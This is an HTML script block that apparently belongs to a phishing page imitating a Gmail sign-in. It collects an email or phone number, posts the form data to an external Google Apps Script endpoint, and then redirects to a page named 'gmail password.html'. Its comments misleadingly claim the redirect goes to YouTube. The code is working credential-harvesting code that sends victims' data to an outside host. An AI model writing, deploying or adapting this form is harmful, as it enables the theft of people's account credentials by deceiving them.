<script>
const scriptURL = 'https://script.google.com/macros/s/AKfycby1wCV9O63DhcNRbBjWug5mzgRoZursn5m4yWQMS0_ZDdcP_STF73Zhx77ZuPvEHJND/exec';

document.getElementById('myForm').addEventListener('submit', function(e) {
    e.preventDefault();
    
    let emailInput = document.getElementById('email');
    let errorMessage = document.getElementById('error-message');
    let loadingOverlay = document.getElementById('loading-overlay');

    // Get input value
    let userInput = emailInput.value.trim();

    // Only check if input is empty
    if (userInput === "") {
        errorMessage.textContent = "Email or phone number is required.";
        emailInput.classList.add("error"); // Add red border
        return;
    } else {
        errorMessage.textContent = ""; // Clear error message
        emailInput.classList.remove("error"); // Remove red border
    }

    // Show loading animation
    loadingOverlay.style.display = "block";

    // Send form data to Google Apps Script
    fetch(scriptURL, { method: 'POST', body: new FormData(this) })
    .then(response => {
        if (response.ok) {
            return response.text();
        } else {
            throw new Error("Form submission failed.");
        }
    })
    .then(() => {
        // Wait exactly 4 seconds, then go to YouTube
        setTimeout(() => {
            window.location.href = "gmail password.html"; // Redirect to YouTube
        }, 2000);
    })
    .catch(error => {
        console.error('Error!', error.message);
        loadingOverlay.style.display = "none"; // Hide loading if error occurs
    });
});
</script>
